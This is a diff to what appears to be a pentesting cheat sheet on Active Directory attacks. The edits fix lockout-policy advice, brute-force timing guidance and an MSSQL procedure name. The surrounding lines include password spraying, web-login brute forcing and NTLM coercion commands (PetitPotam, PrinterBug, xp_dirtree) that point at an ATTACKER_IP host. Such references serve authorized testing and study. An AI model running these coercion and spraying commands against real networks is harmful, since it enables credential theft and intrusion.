@@ -58,7 +58,7 @@ Invoke-Command -ComputerName DC01 -Credential $cred -ScriptBlock { whoami }
 
 If you lock an account by mistake:
 
-- Domain lockouts usually clear automatically after 15-30 minutes.
+- Lockout duration is set by domain policy; check it with `nxc smb <DC_IP> --pass-pol` (or `net accounts /domain`) instead of assuming a fixed time.
 - Work on another machine while you wait.
 - Do not spray special-character passwords across multiple machines.
 
@@ -187,7 +187,7 @@ How to find the right values:
 - BODY = the raw POST body with username/password replaced by ^USER^/^PASS^
 - FAIL_STRING = unique text from the failure response (check the Burp response)
 
-- If an authentication attack is still running after 3 minutes, recheck the command. If it takes that long, the syntax is probably wrong.
+- If an authentication attack produces no responses, recheck the command and flags. A slow protocol or a large wordlist can legitimately take longer than 3 minutes.
 
 ## Creating custom wordlists
 
@@ -273,7 +273,7 @@ Ways to trigger authentication:
 - Web app UNC path — set //ATTACKER_IP/fake in a plugin/feature with a file path field
 - PetitPotam: `python3 PetitPotam.py ATTACKER_IP TARGET_IP`
 - PrinterBug: `python3 dementor.py ATTACKER_IP TARGET_IP`
-- xp_dirtytree (MSSQL): `EXEC master..xp_dirtytree '\\ATTACKER_IP\share'`
+- xp_dirtree (MSSQL): `EXEC master..xp_dirtree '\\ATTACKER_IP\share'`
 
 - Relay ≠ PtH. Relay forwards a live authentication attempt. PtH uses a stolen hash directly.
 
